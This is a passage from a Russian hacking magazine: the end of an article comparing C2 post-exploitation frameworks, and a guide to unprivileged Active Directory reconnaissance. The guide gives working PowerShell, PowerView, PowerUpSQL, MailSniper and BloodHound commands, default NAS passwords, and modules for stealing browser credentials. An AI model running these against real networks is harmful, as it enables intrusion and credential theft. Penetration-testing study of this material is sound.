  Фреймворк для постэксплуата ции. Как ты уже догадал ся, это очередная
платформа для развертывания C2. Она обеспечива ет легкость взаимодей‐
ствия с  агентами посредс твом хорошо документированного REST  API
и Socket.IO.
   Faction состоит из ядра, которое отвечает за вза имодействие пользовате‐
лей с агентами, окружения для создания модулей и агентов, а также CLI
для  управления  фреймворком.  Пользовательские  роли  разграниче ны
на админа, оператора и read only.
  В настоящее время Faction поддерживает только полезные нагрузки
и модули на .NET. В качестве примера полезной наг рузки используется Ma‐
rauder, но ты можешь без проблем соз дать и свой собственный.





В основе взаимо действия Faction и агентов лежит гиб кая система коннекто‐
ров, которая обеспечива ет надежную шифрованную связь. По дефол ту стоит
DIRECT — это соединение напрямую с C2. При создании нового коннектора
генерируется API‐ключ.





Faction также позволя ет запрашивать данные с помощью SQL‐запросов, что
иногда бывает удоб нее, чем взаимодействие с веб‐интерфейсом.
  В целом это неплохой вариант, но очень не хватает интерактивности
и более глубоких настроек инструментов.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

          ФРЕЙМВОРКИ
   ДЛЯ ПОСТЭКСПЛУАТАЦИИ
                   ВЫБИРАЕМ МЕЖДУ METASPLOIT,
           COBALT STRIKE, MERLIN, APFELL, FACTION C2,
                               KOADIC И ДРУГИМИ





KOADIC
https://github.com/zerosum0x0/koadic
  Фреймворк с открытыми исходниками, предназначенный для постэксплу‐
атации в среде Windows. Koadic легок в разверты вании и обращении
и использует для эксплуатации VBScript/JScript. Koadic реально очень «тихий»
и не оставляет столь ко следов в системе,  как, например, фреймворки
на PowerShell. Есть возможность запус кать полез ную нагрузку как на дис ке,
так и в памяти, также Koadic поддерживает шифрование SSL и TLS.





В состав фреймворка входят стейджеры и импланты. Стейджеры определяют
варианты запуска полез ной нагрузки на ата куемой системе, а импланты —
это готовые скриптовые пакеты.





К слову, активные сессии тут называются zombie! :)
  Из коробки доступны самые нужные импланты, но, если что, ты всегда
можешь дополнить этот набор своими.





В консоли Koadic отоб ража ются выполненные и активные задачи  (jobs)
имплантов. Вообще, интерфейс напоминает всеми любимый Metasploit.





Фреймворк  действитель но  можно  назвать  гиб ким  и  эффективным,
и кросс‐платформенность только добавляет к этому имиджу.


MERLIN
https://github.com/Ne0nd0g/merlin
  Еще  один  кросс‐платформенный фреймворк  для  постэкс плуатации,
написан на Go. Одна из особенностей Merlin — это возможность обхода
средств защиты с помощью протокола HTTP/2. В директории фреймворка /
data/bin есть уже заранее скомпилированные агенты для Windows, Linux,
macOS и PowerShell, а также биб лиотеки DLL. По дефол ту в них зашит адрес
https://127.0.0.1:443, который ты всегда можешь изме нить на свой
с помощью флага ‐url, а в случае с DLL посредс твом декомпиляции.





Консоль дружелюбная и интерактивная. Вза имодей ствие с агентами про‐
исходит через создание задач, что, конечно, не совсем «онлайн», но зато
без лишнего шума.





У Merlin большой набор модулей для каждой из платформ, и в нем хорошо
сочетаются легкость, скрытность и эффективность.


EMPIREPROJECT/EMPIRE
https://github.com/EmpireProject/Empire
   Кросс‐платформенный фреймворк  для  пос тэксплуатации,  серверная
часть которого написана на Python. К сожалению, раз витие проекта останов‐
лено, но возможности фреймворка широки и по сей день. Empire включает
в себя агент на PowerShell 2.0 для Windows и агент на Python 2.6/2.7 для Linux
и macOS.
   Этот фреймворк появился в результате объединения двух проектов: Pow‐
erShell Empire и Python EmPyre. Empire отвечает за возможность запуска аген‐
тов PowerShell без исполь зования самого powershell.exe. Это позволя ет быс‐
тро  развернуть  любой  модуль  пос тэкс плуата ции —  от  кейлоггеров
до Mimikatz, а также адаптиру емые средства свя зи для предотвращения
обнаружения.
  Проект имеет большую и дос тупную документацию, в которой ты найдешь
все необходимое для применения Empire.





C3 (CUSTOM COMMAND AND CONTROL) FRAMEWORK (MWR LABS)
https://github.com/mwrlabs/C3
  Наконец, последний фреймворк для постэксплу атации, который мы рас‐
смотрим. Он представляет собой своего рода обертку над C2. Суть фрей‐
мворков C3 — в гибкой коммуника ции внеш него C2 через легитимные про‐
цессы. Например, можно в этих целях приспособить Oﬃce 365, Slack, Google
Drive, Dropbox и другие сервисы, которые повседневно используются в офи‐
сах.
  Впервые концепция С3 была представлена на конференции BlueHat
v18 Уильямом Ноулзом и Дэйвом Хартли. Фреймворк MWR Labs име ет откры‐
тый исходный код и состоит из следующих узлов.
 • Ре лей — исполняемый файл, запущенный на скомпрометированной сис‐
   теме. Релеи взаимо действуют между собой через интерфейсы либо нап‐
  рямую со шлюзом.
 • Шлюз — специальный релей для управления одной сетью C3, отве чает
   за обратную связь с C2.
 • Канал — схема вза имо действия релея внутри легитимных процес сов,
   типичных для атакуемой системы, например через API Slack.
 • Об ратный шлюзовой канал (Gateway Return Channel) — сконфигури‐
   рованный канал, который используется релеем для отправки данных
   обратно на шлюз. Также может быть маршру том через другой релей.
 • Интерфейс — высокоуровневое имя, присваиваемое любому устрой‐
   ству, облегчающему отправку и получение данных в сети C3.
 • Маршрут — предполагаемый путь коммуникаций через релей обратно
   к шлюзу. В качестве периферийного устройства выс тупает сторонний
   имплант C2 (например, Cobalt Strike SMB beacon).
 • Кон нектор —  интегра ция  со  сторонними  системами  C2.  Кстати,
  C3 в исполне нии MWR Labs поддерживает тес ную интеграцию с TeamServ‐
   er Cobalt Strike. В качестве коннектора хорошо работает инстанс Cobalt
   Strike под названием External C2 (команда externalc2_start через
  менеджер скриптов).

На первый взгляд кажется, что C3 слишком сложный, — нужно время, чтобы
во всем этом разоб раться. Но на деле помогают удобный интерфейс, ско‐
ростной деплой и возможность самостоятель но определять архитектуру
с учетом специфики атакуемой системы и прочих вещей.
  Первым делом запусти WebController и задай URL. Либо можешь выпол‐
нить скрипт StartWebController.cmd.





Дальше в веб‐приложении необходимо сконфигурировать первый шлюз.
Как ты уже знаешь, без него работать ничего не будет. :)





После того как шлюз выйдет на связь, ты автомати чески попадешь в консоль
управления фреймворком, где уже будешь строить свою архитектуру.





Многие действия выполняются всего в пару кликов. Ты с легкостью можешь
сгенерировать новый канал, кликнув на шлюз, аналогично на созданный
канал — для генерации нового релея. Вся необходимая информация здесь
будет автоматически заполнена. На данном эта пе можно указать архитектуру,
тип файла (.exe, .dll) и прочее.
  По  каждому релею  доступна  подробная информация:  версия ОС,
под каким пользователем запущен и когда пос ледний раз был онлайн.





Еще важно знать, что тут существует два типа каналов. Согласованный канал
позволяет иметь несколько связей между шлю зом и реле ями (по одному
каналу), несогласованный обеспечивает воз можность связи только одного
релея со шлюзом. На скрине представлен при мер организации согласован‐
ного канала через API Slack.





Фреймворк можно тонко настра ивать и делать любые схе мы коммуникации.
Ты можешь реализовать любые творческие сценарии, что ценно само
по себе.





           Все основные черты рассмотренных фреймворков


ИТОГИ
А теперь поговорим о выборе.
   Это очень важный момент, и здесь нуж но учитывать все особенности век‐
торов атак на целевые системы. Фреймворк должен обес печивать аноним‐
ность и по максимуму удовлетво рять потребности в реализуемых техниках.
Из девяти описанных фреймворков наиболее удобным инструментарием
из коробки обладают Cobalt Strike и Metasploit.
   «Кобальт», особенно в сочетании с MWR Labs C3, обеспечивает достой‐
ный уровень скрытности и неплохо способству ет совместной работе. Metas‐
ploit в бесплатной версии community edition содержит актуальный набор экс‐
плоитов и средств постэкс плуатации, предоставляет гибкие инструменты
генерации полезной  нагрузки и обхода средств антивирусной защиты
(модуль evasion), к сожалению по дефолту малоэффективные, так что нужно
импровизировать. В «Кобальте» же с обходом АВПО все проще, но цена воп‐
роса и сложности с его покупкой могут стать боль шим препятствием.
   Merlin и Koadic прекрасно подойдут для проведения краткосрочных атак
из‐за особенностей взаимо действия с С2. В частности, Merlin позволяет
эффективно использовать сетевые ресурсы с помощью протокола HTTP/2,
что сводит влияние задержек к миниму му (благодаря сжатию полей заголов‐
ков). Одновременно это дает воз можность обмениваться данными в рамках
одного соединения, что полезно при обходе IPS и IDS. Достоинством Koadic
может быть применение Windows Scripting Host (компонент Windows, пред‐
назначенный для запус ка приложений на скриптовых JScript и VBScript).
Это позволяет исполь зовать сценарии, ана логичные пакетным файлам, но с
дополнительными возможностями. Благодаря  этой функции  его можно
использовать во многих версиях Windows, включая Windows 10.
    Apfell, Faction и Covenant — молодые и раз вивающиеся фреймворки,
в которых все еще встречаются небольшие баги. Это пока что ставит
под сомнение их исполь зование в случаях, когда ошибаться нельзя. Ана‐
логичная ситуация с Empire: из‐за того что проект больше не развивается,
стабильность фреймворка изрядно пошатнулась, и в серьезных операциях
использовать его я бы не стал.
  И конечно же, в этой статье затронуты далеко не все существующие инс‐
трументы. Экспериментируй, и ты найдешь, что тебе по душе!
ВЗЛОМ

 РАЗВЕДКА
   ACTIVE DIRECTORY В





            ПОЛУЧАЕМ
            ПОЛЬЗОВАТЕЛЬСКИЕ
           ДАННЫЕ В СЕТЯХ WINDOWS

          RalfHacker            БЕЗ ПРИВИЛЕГИЙ      hackerralf8@gmail.com





Представь, что кто‐то проводит атаку на корпоративную сеть
Windows. Вначале у злоумышленника либо мало привилегий
в домене, либо их вовсе нет. Поэто му искать учетные записи
и службы он будет без повышенных привилегий, то есть не от
имени админис тратора домена или локального администра‐
тора. О том, как про изводится разведка в среде Active Direc‐
tory, мы и поговорим.


Рассмотренные в данной статье примеры применимы для сле дующих версий
Windows: 7, 8, 10, Server 2008, Server 2012 и Server 2016; другие не проверяли.
Также для работы примеров в системе должен быть PowerShell с указанными
модулями.


           WARNING

                      Вся информация предоставлена исключительно
                        в ознакомительных целях. Ни редак ция, ни автор
                      не несут ответственности за любой возможный
                        вред, причинен ный информацией из этой статьи.



СКАНИРОВАНИЕ SPN
Когда нужно повысить привилегии, злоумышленники обычно используют учет‐
ные записи служб, поскольку у таких учеток больше прав, но нет строгой
политики смены пароля через заданный промежуток вре мени. То есть если
скомпрометировать их, то потом мож но долго оста ваться незамеченным.


             INFO

                          Service Principal Names (SPN) — идентификаторы
                        служб, запущенных на доменной машине. Не зная
                           их, ты  не сможешь  искать  службы,  которые
                       используют проверку подлинности Kerberos.


SPN‐строка име ет такой формат:


SPN="serviceclass"/"hostname[:port]"[/"servicename"]

 • Serviceclass — строка, которая идентифици рует класс службы, нап‐
  ример ldap — идентифика тор для службы катало гов;
 • Hostname — строка, где указыва ется пол ное доменное имя сис темы,
   а иногда и порт;
 • Servicename — строка, которая представляет собой уникальное имя
   (DN), GUID объекта или полностью определен ное доменное имя (FQDN)
   службы.

SPN уникальный в пределах леса. Когда компь ютер добавляют в домен, у его
учетной записи автоматически ука зыва ется host SPN, что поз воляет службам
на этой машине запускаться из‐под локальных учет ных записей, таких как Lo‐
cal System и Network Service.
   Сканирование SPN — это первое, что обычно делает злоумышленник
или пентестер при поиске служб в среде Active Directory. Основное пре иму‐
щество этого метода по сравнению со ска нированием сетевых портов в том,
что не требуется взаимодействие с каж дым узлом сети для проверки служеб‐
ных портов. Сканирование SPN позволяет обнаружить службы с помощью
запросов LDAP к контроллеру домена. Так как запросы SPN — нормальное
поведение проверки подлиннос ти Kerberos, этот способ сканирования обна‐
ружить очень сложно (даже почти нереально), в отличие от сканирования
портов.
  Выполнить сканирование SPN можно с помощью скрипта на PowerShell.





         Результат работы скрипта для серверов Microsoft SQL

Наиболее интересные служ бы:
 • SQL (MSSQLSvc/adsmsSQLAP01.ads.org:1433)
 • Exchange (exchangeMDB/adsmsEXCAS01.ads.org)
 • RDP (TERMSERV/adsmsEXCAS01.adsecurity.org)
 • WSMan / WinRM / PS Remoting (WSMAN/adsmsEXCAS01.ads.org)
 • Hyper‐V (Microsoft Virtual Console Service/adsmsHV01.ady.org)
 • VMware VCenter (STS/adsmsVC01.ads.org)

Хочу поделиться с тобой и еще одним интересным скриптом, который
покажет тебе все SPN для всех пользователей и всех компьютеров.


$search = New‐Object DirectoryServices.DirectorySearcher([ADSI]"")
$search.filter = "(servicePrincipalName=*)"
$results = $search.Findall()
foreach($result in $results){
    $userEntry = $result.GetDirectoryEntry()
    Write‐host "Object Name = " $userEntry.name ‐backgroundcolor
"yellow" ‐foregroundcolor "black"
    Write‐host "DN      =      "  $userEntry.distinguishedName
    Write‐host "Object Cat. = "  $userEntry.objectCategory
    Write‐host "servicePrincipalNames"
    $i=1
    foreach($SPN in $userEntry.servicePrincipalName)
    {
        Write‐host "SPN(" $i ")   =      " $SPN       $i+=1
    }
    Write‐host ""
}





               Результат работы cкрипта — список SPN


СБОР ДАННЫХ
Об щие ресурсы
В среде Active Directory час то используются сетевые папки и файловые сер‐
веры. Эти команды отобразят список общих ресурсов на локальном хос те,
список сетевых компьютеров и список шар на уда ленном компьюте ре:


> net share
> net view
> net view COMPUTER_NAME /all

Но что делать, если политика безопасности запреща ет использовать сетевые
команды? В этом  случае нас  выручит wmic. Список общих ресурсов
на локальном хосте и список общих ресурсов на удаленном компьютере мож‐
но посмотреть с помощью команд


> wmic share get /format:list
> wmic /node: COMPUTER_NAME share get

Полезный инструмент для поиска данных — PowerView. Он автоматичес ки
обнаруживает сетевые ресурсы и файловые серверы с помощью команд
Find‐DomainShare и Get‐DomainFileServer.
   Кстати, PowerView встро ен в фреймворк PowerShell Empire и представлен
двумя модулями:
 • situational_awareness/network/powerview/share_finder;
 • situational_awareness/network/powerview/get_fileserver.


Базы дан ных
В среде  Active  Directory, как правило, нес коль ко серверов баз данных.
PowerUpSQL — отличный инстру мент для обнаружения и перечисления сер‐
веров Microsoft SQL и атак на них.
  Найти все локальные экземпляры SQL можно командой


> Get‐SQLInstanceLocal ‐Verbose

Чтобы найти все экземпляры SQL в сети или домене, используй команды


> Get‐SQLInstanceDomain ‐Verbose
> Get‐SQLInstanceBroadcast ‐Verbose
> Get‐SQLInstanceScanUDP ‐Verbose

После поиска собираем информацию об экземпля рах SQL. Локальных:


> Get‐SQLInstanceLocal | Get‐SQLServerInfo

И удаленных:


> Get‐SQLServerInfo ‐Instance "COMPUTER_NAME"

Когда мы нашли все экземпляры SQL и собрали информацию о них, мы
можем:
 • получить список экземпляров SQL, в которые разрешен вход текуще му
   пользователю домена:


> Get‐SQLInstanceDomain –Verbose | Get‐SQLConnectionTestThreaded
–Verbose ‐Threads 10

 • попытаться получить права администратора для экземпля ра SQL:


> Invoke‐SQLEscalatePriv ‐Verbose ‐Instance "COMPUTER_NAME"

 • перечислить экземпляры SQL по всему домену с использованием паролей
   по умолчанию:


> Get‐SQLInstanceDomain ‐Verbose | Get‐SQLServerLoginDefaultPw
‐Verbose

 • сдампить информацию о SQL Server и базе данных в файлы CSV или XML:


> Invoke‐SQLDumpInfo ‐Verbose ‐Instance "COMPUTER_NAME"

 • запустить функции аудита для сервера SQL:


> Invoke‐SQLAudit ‐Verbose ‐Instance "COMPUTER_NAME"


Network Attached Storage
Network Attached Storage (NAS) — сервер для хра нения данных на файловом
уровне. Поскольку там сло жены файлы, нередко это и есть цель злоумыш‐
ленника. NAS не нужна полноценная операционка, поэтому на них часто ста‐
вят FreeNAS или NAS4Free на базе FreeBSD. Большинство NAS можно адми‐
нистрировать через веб или SSH. В таком случает следует перебрать дефол‐
тные связки логин — пароль. Вот пятерка самых рас пространенных:
 • admin:admin;
 • admin:password;
 • root:nasadmin;
 • nasadmin:nasadmin;
 • admin:"no pass".


Пользовательские дан ные при наличии привиле гий
Учетные дан ные пользовате лей
Для охоты на поль зователей отлично подходит BloodHound — инстру мент
для активного поиска катало гов.
  Определить, где конкрет ный пользователь или группа пользователей вош‐
ли в систему, можно с помощью команд PowerView и модуля PowerShell
Empire.



  > Find‐DomainUserLocation ‐UserIdentity USER_NAME
  > Find‐DomainUserLocation ‐UserGroupIdentity GROUP_NAME


  situational_awareness/network/powerview/user_hunter



Ло кальные дан ные
После компрометации учетных данных пользователей появляется много воз‐
можностей: запись на рабочий стол, получение картинки с веб‐камеры, сброс
паролей, установка кейлоггеров. Большая часть этих возможностей авто‐
матизирована  в  инстру ментах  Metasploit  Framework,  PowerShell  Empire
и Cobalt Strike.
  Многие — может быть, даже ты — позволяют браузерам сохранять свои
пароли. И часто мы используем одни и те же пароли для разных сервисов, так
что найденные в браузере пароли нам еще, ско рее всего, при годятся.
   Вот модули Metasploit, которые помога ют в этом:
 • post/windows/gather/enum_chrome
 • post/multi/gather/firefox_creds
 • post/firefox/gather/cookies
 • post/firefox/gather/passwords
 • post/windows/gather/forensics/browser_history

Модули PowerShell Empire:
 • collection/ChromeDump
 • collection/FoxDump

Вытащить пароли можно и вручную. Для этого сохрани профиль браузера,
импортируй его на виртуальную машину, открой браузер и пос мотри пароли.
  Файлы профилей Firefox лежат в C:\Users\TARGET\AppData\Roaming\
Mozilla\Firefox\Profiles, а про филей Google Chrome — в C:\Users\TAR‐
GET\AppData\Local\Google\Chrome\User Data\Default. Чтобы узнать дан‐
ные удаленного доступа, можно использовать модуль Metasploit post/win‐
dows/gather/enum_putty_saved_sessions или модули Empire collection/
netripper и credentials/sessiongopher.


Пользовательские файлы
Часто цель атакующего — это пользовательские файлы. Для их поиска есть
очень удобный скрипт на PowerShell — WMImplant. Он позволяет исполь‐
зовать фильтры. Например, чтобы найти файл с именем wmimplant, выполним
команды


> $filefilter = "Filename = 'wmimplant' AND Drive='C:'"
> Get‐WMIObject ‐Class CIM_Datafile ‐filter $filefilter





     Поиск файла wmimplant на диске C с использованием WMImplant

Также можно настроить филь тр по расширению фай ла.


> $filefilter = "Extensios = 'ps1' AND Drive='C:'"
> Get‐WMIObject ‐Class CIM_Datafile ‐filter $filefilter





      Поиск файлов *.ps1 на диске C с использованием WMImplant

Для поиска файлов на удаленной машине ука зывай для Get‐WMIObject
параметр ‐ComputerName.


Microsoft Exchange и Outlook при наличии привиле гий
Если у злоумышленника есть учетные данные поль зователей, то почтовые
ящики, считай, тоже скомпрометированы. Если ты выступаешь на атакующей
стороне, открывай панель Outlook и делай запросы, по которым могут най‐
тись полезные данные. Например, логин, пароль, password, pass, cre‐
dentials, vpn, ssh, root, confidential.
   Этот процесс можно авто матизировать при помощи инструмента Mail‐
Sniper. Для  автоматического обнаружения целевого сервера Exchange
и поиска в почтовом ящике user@example.com используй такую команду:


> Invoke‐SelfSearch ‐OutputCsv local‐results.csv ‐Mailbox
user@example.com

Если ящик известен, то такую:


> Invoke‐SelfSearch ‐Remote ‐ExchHostname outlook.office365.com
‐OutputCsv local‐results.csv ‐Mailbox user@example.com

Если у тебя уже есть пра ва администра тора Exchange, можно искать по всем
почтовым ящикам:


> Invoke‐GlobalMailSearch ‐ImpersonationAccount TARGET_USER ‐ExchHo
stname Exch01 ‐OutputCsv global‐results.csv


УЧЕТНЫЕ ДАННЫЕ
Учетные записи администраторов домена
Существует два эффективных метода искать учетные записи с повышенными
правами в Active Directory. Первый — стандартный метод перечис ления групп,
который идентифицирует всех членов обычных групп администраторов Active
Directory. В большинстве организа ций есть пользовательские группы адми‐
нистраторов — схемы именования могут быть разными, но если искать
по слову admin, то, скорее всего, не промахнешь ся.



  > get‐adgroup ‐filter {GroupCategory ‐eq 'Security' ‐AND Name ‐like "ad‐
  min"}
  DistinguishedName : CN=Server Admins,OU=AD Management,DC=lab,DC=adsecu‐
  rity,DC=org
  GroupCategory : Security
  GroupScope : Global
  Name : Server Admins
  ObjectClass : group
  ObjectGUID : 3877c311‐9321‐41c0‐a6b5‐c0d88684b335
  SamAccountName : ServerAdmins
  SID : S‐1‐5‐21‐1581655573‐3923512380‐696647894‐2628


Второй метод — искать учетки, у которых атрибут AdminCount равен единице.



  > get‐aduser ‐filter {AdminCount ‐eq 1} ‐Properties Name,AdminCount,Ser‐
  vicePrincipalName,MemberOf
  AdminCount        : 1
  DistinguishedName : CN=ADSAdministrator,CN=Users,DC=lab,DC=ads,DC=org
  Enabled           : True
  MemberOf          : {CN=Administrators,CN=Builtin,DC=lab,DC=ads,DC=org,
  CN=Schema Admins,CN=Users,DC=lab,DC=ads,DC=org, CN=Group
  Policy Creator Owners,CN=Users,DC=lab,DC=ads,DC=org, CN=Enterprise Ad‐
  mins,CN=Users,DC=lab,DC=ads,DC=org…}
  Name              : ADSAdministrator
  ObjectClass       : user
  ObjectGUID        : 72ac7731‐0a76‐4e5a‐8e5d‐b4ded9a304b5
  SamAccountName    : ADSAdministrator
  SID               : S‐1‐5‐21‐1581655573‐3923512380‐696647894‐500
  Surname           :
  UserPrincipalName :


Но учти, что в числе прочего получишь учетки, у которых прав администратора
нет. Дело в том, что это зна чение не сбрасыва ется автоматически пос ле уда‐
ления учетной записи из групп администраторов.


Скры тая учетная запись администратора
Скрытая учетная запись администра тора — это учетная запись домена,
которая пре доставляет администра тору дос туп к контроллеру домена, сер‐
веру обмена или серверу баз данных. Но эта запись не при надлежит к при‐
вилегированным группам Active Directory, то есть администраторам домена.
Разрешения для таких учеток назначаются нап рямую с помощью списков кон‐
троля доступа (ACL) для объектов Active Directory.
   Часто это учетные записи служб. Они обычно имеют дос туп к нескольким
системам в среде. При этом такие учетки не получа ют столько же внимания
и таких же строгих политик безопасности, как адми нистраторы домена.
В результате они становятся главной целью злоумышленников при «движении
вбок» или повышении привилегий.
  Для поиска скрытых учетных записей администратора используй тулзу
BloodHound. Полную инс трукцию по уста новке этого инс трумента можешь
найти в вики проекта.
  После настройки базы данных и входа в веб‐интерфейс BloodHound мож‐
но начинать собирать данные Active Directory с помощью BloodHound Power‐
Shell. Вот как запустить команды для поиска доменов в лесу и сохранить CSV
в указанную папку:


> . .\SharpHound.ps1
> Invoke‐BloodHound ‐SearchForest ‐CSVFolder C:\Users\Public





              Результат работы BloodHound PowerShell

После загрузки файла у тебя есть большой выбор дальнейших действий.
Можно просмотреть всех администраторов домена, глянуть список поль‐
зователей с правами локальных администра торов, определить машины
с правами администраторов и многое дру гое.





                       Зап росы BloodHound

Таким  образом,  при  просмотре  «карты  доверительных  отношений»
и «10 пользователей с большинством прав локальных админис траторов» мы
сможем определить учет ные записи, которые имеют доступ к большинству
систем, а также узнать, существуют ли двусторонние отношения доверия
между внешними доменами, которые могли бы рас ширить круг доступных
ресурсов.
  Другой способ найти скрытые учетные записи администратора — поиск
контроллера домена.
 1. Ищем группу Domain Controllers.
 2. Выбираем «Прямые участники» в разделе «Участники группы»: там отоб‐
  ражены все узлы системы контроллера домена в этой группе.
 3. Ткнув на один из узлов системы в раз деле «Местные администраторы»,
   выбираем «Производные локальные адми нистраторы».





               BloodHound — локальные администраторы

Как видишь, есть две учетные записи, которые имеют локальный доступ адми‐
нистратора к контрол леру домена. Они не входят в группу «Админис траторы
домена». Поздравляю, мы только что обна ружи ли две скрытые учетные
записи администратора!


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

          РАЗВЕДКА
    ACTIVE DIRECTORY  В
            ПОЛУЧАЕМ ПОЛЬЗОВАТЕЛЬСКИЕ ДАННЫЕ
               В СЕТЯХ WINDOWS БЕЗ ПРИВИЛЕГИЙ





Группы Active Directory
Группы Active Directory бывают двух типов.
 1. Группы распространения — используются для списков рассылки элек‐
   тронной почты и не могут служить для контроля дос тупа к ресурсам, поэто‐
   му они нам неинтересны.
 2. Группы безопасности — могут применяться для контроля доступа
   и добавлены в списки контро ля дос тупа.

Независимо от того, к какому типу относится группа, она задается битом
в свойстве groupType.
   Группы безопасности могут иметь одну из трех областей действия.
Область действия группы влияет на то, какие типы групповых объ ектов могут
быть добавлены в нее и в какие дру гие группы группа может быть вложена.
 1. Глобальные группы могут быть вложены в локальные группы домена, уни‐
   версальные группы и другие глобальные группы в одном домене.
 2. Универсальные группы могут быть вло жены в локальные группы домена
   и другие универсальные группы в любом домене.
 3. Локальная группа домена не может быть вложена в глобальную или уни‐
   версальную группу.

Найти все группы какого‐то типа мож но с помощью PowerView.
 • GetDomainGroup  GroupScope  DomainLocal — найти локальные
   группы;
 • GetDomainGroup GroupScope NotDomainLocal — найти нелокаль‐
  ные группы;
 • GetDomainGroup GroupScope Global — найти глобальные группы;
 • GetDomainGroup GroupScope NotGlobal — найти неглобальные
   группы;
 • GetDomainGroup GroupScope Universal— найти универсальные
   группы;
 • GetDomainGroup GroupScope NotUniversal — найти неуни вер‐
   сальные груп пы;
 • GetDomainGroup  GroupProperty  Security —  найти  группы
   безопасности;
 • GetDomainGroup GroupProperty Distribution — найти группы
   распространения;
 • GetDomainGroup GroupProperty CreatedBySystem — найти груп‐
   пы, созданные системой.





       Пример поиска всех универсальных групп в текущем домене


Информация из локальных групп Active Directory
Найти локальных администраторов мож но с помощью команды


> Invoke‐EnumerateLocalAdmin | ft ‐autosize





                Список локальных адми нистраторов

Получить список всех пользователей поможет модуль PowerShell activedi‐
rectory, достаточно выполнить команду Get_ADUser ‐filter *. Получить
список групп, в которых числится определен ный пользователь, можно коман‐
дой Get‐NetGroup ‐UserName [user].
   Также есть возможность узнать список компь ютеров, к которым имеет
доступ конкретный пользователь или группа. Для это го используй команды


> Find‐GPOLocation ‐UserName [user]
> Find‐GPOLocation ‐GroupName [group]

Но можно вернуть и список объектов, имеющих доступ к опре деленному
компьютеру. Для это го есть команда


> Find‐GPOComputerAdmin ‐ComputerName [computer] ‐Recurse

Еще очень важная информация, которую мы можем получить: какие объекты
групповой политики применяются к конкретной машине. Делается это коман‐
дой


> Get‐DomainGPO ‐ComputerIdentity [PC_id] ‐Properties displayname

Важно,  что  все  эти  функции  позволяют  запрашивать  информацию
без повышенных привилегий.


LOCAL ADMINISTRATOR PASSWORD SOLUTION
Local Administrator Password Solution (LAPS) — сис тема, пред назначенная
для управле ния пароля ми локальных админис траторов на компьютерах
домена. Она позволя ет администратору домена периодически менять пароль
учетной записи локальных администра торов, делеги ровать права на чте ние
и сброс пароля для пользователей или групп Active Directory, а также обес‐
печивает хранение паролей в расширенном атрибуте объ екта компьютера
в Active Directory. Система сос тоит из трех компонентов: агента, модуля Pow‐
erShell для настрой ки сис темы, Active Directory для хранения паролей.
   Есть два способа обна ружить LAPS.
 1. На всех хостах, где установлен LAPS, в папке C:\Program Files\LAPS\
  CSE\ будет файл AdmPwd.dll.
 2. Конфигурации LAPS определяются в объектах груп повой политики. Коман‐
   дой GetDomainGPO Identity "*LAPS*" можно поискать любой объ‐
   ект групповой политики, у которого есть сло во LAPS в отображаемом име‐
   ни.



  displayname              : LAPS
  ...
  gpcfilesyspath           : \\test.local\SysVol\test.local\Policies\{
  C3801BA8‐56D9‐4F54‐B2BD‐FE3BF1A71BAA}
  distinguishedname        : CN={C3801BA8‐56D9‐4F54‐B2BD‐FE3BF1A71BAA},
  CN=Policies,CN=System,DC=testlab,DC=local
  ...


Таким образом мы сможем определить, есть ли LAPS на нашей машине. Ког‐
да мы выясним, что LAPS на машине точно есть, смотрим конфиг. Конкретная
конфигурация для политики LAPS находится в Registry.pol в раз деле gpc‐
filesyspath. Для декодирова ния используй инс трумент GPRegistryPolicy:


Parse‐PolFile "\\test.local\SysVol\test.local\Policies\{
C8701BA8‐56D9‐4123‐B6B2‐FE3FA5031BAA}\Machine\Registry.pol"

Пример вывода команды:



  KeyName     : Software\Policies\Microsoft Services\AdmPwd
  ValueName   : PasswordComplexity
  ValueType   : REG_DWORD
  ValueLength : 4
  ValueData   : 4


  KeyName     : Software\Policies\Microsoft Services\AdmPwd
  ValueName   : PasswordLength
  ValueType   : REG_DWORD
  ValueLength : 4
  ValueData   : 8


  KeyName     : Software\Policies\Microsoft Services\AdmPwd
  ValueName   : PasswordAgeDays
  ValueType   : REG_DWORD
  ValueLength : 4
  ValueData   : 30


  KeyName     : Software\Policies\Microsoft Services\AdmPwd
  ValueName   : AdminAccountName
  ValueType   : REG_SZ
  ValueLength : 26
  ValueData   : localfish


  KeyName     : Software\Policies\Microsoft Services\AdmPwd
  ValueName   : AdmPwdEnabled
  ValueType   : REG_DWORD
  ValueLength : 4
  ValueData   : 1


Сложность пароля равна четырем (верхний и нижний регистр, а также циф ры
и специальные символы), длина пароля — восемь символов, срок действия
пароля — 30 дней, и политика распростра няется на локальную учетную
запись localfish.
   Теперь найдем все компь ютеры, к которым при менен этот объ ект груп‐
повой политики. Для этого нам нужно знать GUID этого объ екта. Сначала
определим подразделения, а потом  в каждом подразделении най дем
рабочие станции.



  > Get‐DomainOU ‐GPLink "C3801BA8‐56D9‐4F54‐B2BD‐FE3BF1A71BAA" ‐Proper‐
  ties distinguishedname
  distinguishedname
  ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
  OU=Workstations,DC=testlab,DC=local
  OU=Servers,DC=testlab,DC=local


  > Get‐DomainComputer ‐SearchBase
  "LDAP://OU=Workstations,DC=testlab,DC=local" ‐Properties distinguished‐
  name
  distinguishedname
  ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
  CN=WKSTN02,OU=Workstations,DC=testlab,DC=local
  CN=WKSTN01,OU=Workstations,DC=testlab,DC=local
  CN=WKSTN03,OU=Workstations,DC=testlab,DC=local
  CN=WKSTN04,OU=Workstations,DC=testlab,DC=local


  > Get‐DomainComputer ‐SearchBase "LDAP://OU=Servers,DC=testlab,DC=local"
  ‐Properties distinguishedname
  distinguishedname
  ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
  CN=FS01,OU=Servers,DC=testlab,DC=local


Мы нашли все компьютеры, на которые рас простра няется эта конфигурация
LAPS. Компонент LAPS PowerShell дает мно го возможностей. Например, вот
такой командой мы можем определить, что LAB\Workstation Admins и LAB\
Server Admins имеют расширенные права в подразделениях Workstations
и Servers:



  > Find‐AdmPwdExtendedRights ‐Identity "Workstations" | fl
  ObjectDN             : OU=Workstations,DC=testlab,DC=local
  ExtendedRightHolders : {NT AUTHORITY\SYSTEM, LAB\Domain Admins, LAB\
  Workstation Admins}


  > Find‐AdmPwdExtendedRights ‐Identity "Servers" | fl
  ObjectDN             : OU=Servers,DC=testlab,DC=local
  ExtendedRightHolders : {NT AUTHORITY\SYSTEM, LAB\Domain Admins, LAB\
  Server Admins}


